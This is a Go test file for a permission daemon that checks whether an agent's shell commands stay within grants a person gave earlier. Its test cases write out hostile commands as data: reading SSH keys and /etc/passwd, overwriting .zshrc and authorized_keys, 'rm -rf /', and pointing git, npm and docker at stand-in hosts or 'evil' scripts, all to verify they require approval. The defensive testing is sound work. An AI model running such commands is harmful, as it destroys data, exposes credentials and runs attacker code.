package daemon

import (
	"testing"

	"github.com/sabr-software/pilothouse/internal/api"
)

// Each pair is a grant a person gave and a later command it used to cover
// without asking. All of them must go back to a person.
func TestGrantDoesNotWiden(t *testing.T) {
	tests := []struct{ name, granted, next string }{
		// A reader grant must not write or read outside the folder.
		{"sort output in a flag cluster", `cat README.md`, `sort -ro /Users/me/.zshrc x`},
		{"sort output, home in a cluster", `cat README.md`, `sort -ro~/.zshrc x`},
		{"sort long option abbreviated", `cat README.md`, `sort --out=/Users/me/.zshrc x`},
		{"sort temp dir", `cat README.md`, `sort -T /tmp x`},
		{"sed in place", `cat README.md`, `sed -n -i.bak 1,5p src/x`},
		{"sed in place, clustered", `cat README.md`, `sed -ni 1,5p src/x`},
		{"sed write command via -e", `cat README.md`, `sed -n -e'w /Users/me/.zshrc' src/x`},
		{"sed script file", `cat README.md`, `sed -n -f /tmp/evil.sed src/x`},
		{"grep patterns from a file outside", `cat README.md`, `grep -f/Users/me/.ssh/id_ed25519 x`},
		{"grep patterns from a secrets file", `cat README.md`, `grep -f.env x`},
		{"brace expansion", `cat README.md`, `cat {/etc/passwd,README.md}`},
		{"glob that matches ..", `cat README.md`, `cat .*/secret.txt`},
		{"glob that matches .., nested", `cat README.md`, `cat src/.?/../../secret.txt`},
		{"rg hostname program", `cat README.md`, `rg --hostname-bin ./evil x src`},
		{"rg preprocessor", `cat README.md`, `rg --pre=./evil x src`},
		// Assignments and sudo are not the program.
		{"assignment prefix", `NODE_ENV=test npm test`, `NODE_ENV=test npm publish`},
		{"sudo", `sudo rm build`, `sudo rm -rf /`},
		{"sudo, other command", `sudo ls`, `sudo rm -rf /`},
		{"env wrapper", `env FOO=1 npm test`, `env FOO=1 npm publish`},
		// An unknown program's second word is an argument, not a subcommand.
		{"rm", `rm build`, `rm build -rf /Users/me/Documents`},
		{"ssh", `ssh host`, `ssh host rm -rf /`},
		{"cp", `cp a b`, `cp a /Users/me/.ssh/authorized_keys`},
		{"chmod", `chmod 644 a`, `chmod 644 /etc/passwd`},
		// Global options that change what runs or where.
		{"git config that runs a program", `git status`, `git -c core.fsmonitor=/tmp/evil.sh status`},
		{"git pager", `git log`, `git -c core.pager=/tmp/evil.sh log`},
		{"git in another repository", `git status`, `git -C /Users/me/other status`},
		{"git in the parent", `git status`, `git -C .. status`},
		{"git other git dir", `git status`, `git --git-dir=/Users/me/other/.git status`},
		{"git exec path", `git status`, `git --exec-path=/tmp/evil status`},
		{"make other makefile", `make test`, `make -f /tmp/evil.mk test`},
		{"make other makefile after the target", `make test`, `make test -f /tmp/evil.mk`},
		{"make other directory", `make test`, `make -C /Users/me/other test`},
		{"npm registry", `npm install`, `npm --registry http://evil.example install`},
		{"docker host", `docker ps`, `docker -H tcp://evil.example:2375 ps`},
		{"kubectl context", `kubectl get pods`, `kubectl --context prod get pods`},
		{"cargo config", `cargo build`, `cargo --config /tmp/evil.toml build`},
		// A key grant doesn't cover a riskier use of the same subcommand.
		{"force push", `git push`, `git push --force`},
		{"force push after a remote", `git push origin feature`, `git push origin feature --force`},
		{"hard reset", `git reset`, `git reset --hard`},
		{"clean", `git clean -n`, `git clean -fdx`},
		{"touch outside", `touch a`, `touch /Users/me/.ssh/authorized_keys`},
		{"mkdir outside", `mkdir -p a`, `mkdir -p /etc/x`},
		{"tree output file", `tree`, `tree -o /Users/me/.zshrc`},
		{"tree output file, whole-program grant", `tree src`, `tree -o /Users/me/.zshrc src`},
		{"git output file", `git log`, `git log --output=/Users/me/.zshrc`},
		{"go test exec outside", `go test ./...`, `go test -exec /tmp/evil ./...`},
		{"docker mount of /", `docker run alpine`, `docker run -v /:/host alpine`},
		{"path outside as an argument", `git add src`, `git add /Users/me/other/file`},
		{"home as an argument", `git diff`, `git diff --no-index ~/.ssh/id_ed25519 a`},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			gs := grantsFrom(tt.granted)
			if g, ok := matchGrantAt(gs, "Bash", api.ToolShell, tt.next, testCwd, testRoot); ok {
				t.Errorf("after allowing %q, %q ran without asking (grant %q; grants %+v)", tt.granted, tt.next, g.Prefix, gs)
			}
		})
	}
}

// The other side: hardening must not turn ordinary follow-ups into
// questions.
func TestGrantStillCoversOrdinaryFollowUps(t *testing.T) {
	tests := []struct{ granted, next string }{
		{`git push`, `git push origin main`},
		{`git push origin main`, `git push`},
		{`git status`, `git status --short`},
		{`git -C web status`, `git status`},
		{`git status`, `git -C web status --short`},
		{`git -C /Users/me/Projects/ERP/web log`, `git log --oneline -5`},
		{`git -c user.name=x commit -m wip`, `git commit --amend`},
		{`git commit -m wip`, `git -c user.name=x -c user.email=x@y.z commit -m other`},
		{`git commit -m wip`, `git commit -m "fix /etc/hosts parsing"`},
		{`git --no-pager log`, `git log -3`},
		{`npm --prefix web run build`, `npm run test`},
		{`npm run build`, `npm --prefix web run lint`},
		{`npm test`, `npm test -- src/a.test.ts`},
		{`npm test`, `timeout 60 npm test`},
		{`kubectl delete pod x`, `kubectl delete pod y`},
		{`kubectl -n dev get pods`, `kubectl get pods -n dev`},
		{`go test ./...`, `go test -race -run TestX ./internal/...`},
		{`go -C tools build ./...`, `go build ./cmd/x`},
		{`cargo +nightly build`, `cargo build --release`},
		{`terraform -chdir=infra plan`, `terraform plan`},
		{`make test`, `make test VERBOSE=1`},
		{`make -C web test`, `make test`},
		{`mkdir -p a`, `mkdir -p b/c`},
		{`ls -la src`, `ls docs`},
		{`ls /usr/local/bin`, `ls /usr/local`},
		{`pytest -q tests/unit`, `pytest -q tests/unit`},
		{`./gradlew test`, `./gradlew test`},
		// Readers keep working with their everyday options.
		{`cat README.md`, `sed -n '1,120p' src/a.ts`},
		{`cat README.md`, `sed -n -e 1,5p src/a.ts`},
		{`cat README.md`, `sed -nE 1,5p src/a.ts`},
		{`cat README.md`, `sort -rn -k2,2 -t, data.csv | head -5`},
		{`cat README.md`, `sort -rnk2 data.csv`},
		{`cat README.md`, `sort --reverse --unique data.csv`},
		{`cat README.md`, `grep -rn -A3 -e foo src`},
		{`cat README.md`, `grep -rnE ".*foo" src`},
		{`cat README.md`, `grep -rn "{a,b}" src`},
		{`cat README.md`, `find . -name '.*' -type f`},
		{`cat README.md`, `find . -name '*.{ts,tsx}'`},
		{`cat README.md`, `cat src/*.md`},
		{`cat README.md`, `cat .github/workflows/ci.yml`},
		{`cat README.md`, `rg -n "foo" -g '*.go' internal`},
	}
	for _, tt := range tests {
		gs := grantsFrom(tt.granted)
		if _, ok := matchGrantAt(gs, "Bash", api.ToolShell, tt.next, testCwd, testRoot); !ok {
			t.Errorf("after allowing %q, %q asks again (grants %+v)", tt.granted, tt.next, gs)
		}
	}
}

// A command carrying a blocking risk label is granted as itself, not as its
// key: allowing one force push is not allowing every push.
func TestRiskyCommandIsGrantedExactly(t *testing.T) {
	tests := []struct {
		granted string
		want    []string
	}{
		{`git push --force`, []string{"git push --force"}},
		{`git push origin main`, []string{"git push"}},
		{`git reset --hard`, []string{"git reset --hard"}},
		{`kubectl delete pod x`, []string{"kubectl delete"}},
		{`NODE_ENV=test npm test`, []string{"NODE_ENV=test npm test"}},
		{`sudo rm build`, []string{"sudo rm build"}},
		{`rm build`, []string{"rm build"}},
		{`git -c core.pager=less log`, []string{"git -c core.pager=less log"}},
		{`git -C /Users/me/other status`, []string{"git -C /Users/me/other status"}},
		{`tree -o out.txt`, []string{"tree -o out.txt"}},
	}
	for _, tt := range tests {
		req := api.Request{Tool: "Bash", ToolKind: api.ToolShell, Command: tt.granted, Cwd: testCwd}
		got := grantKeys(req, testRoot)
		if len(got) != len(tt.want) || got[0] != tt.want[0] {
			t.Errorf("grantKeys(%q) = %q, want %q", tt.granted, got, tt.want)
		}
		// The exact command it came from is always covered.
		if _, ok := matchGrantAt(grantsFrom(tt.granted), "Bash", api.ToolShell, tt.granted, testCwd, testRoot); !ok {
			t.Errorf("allowing %q doesn't cover the same command again", tt.granted)
		}
	}
}
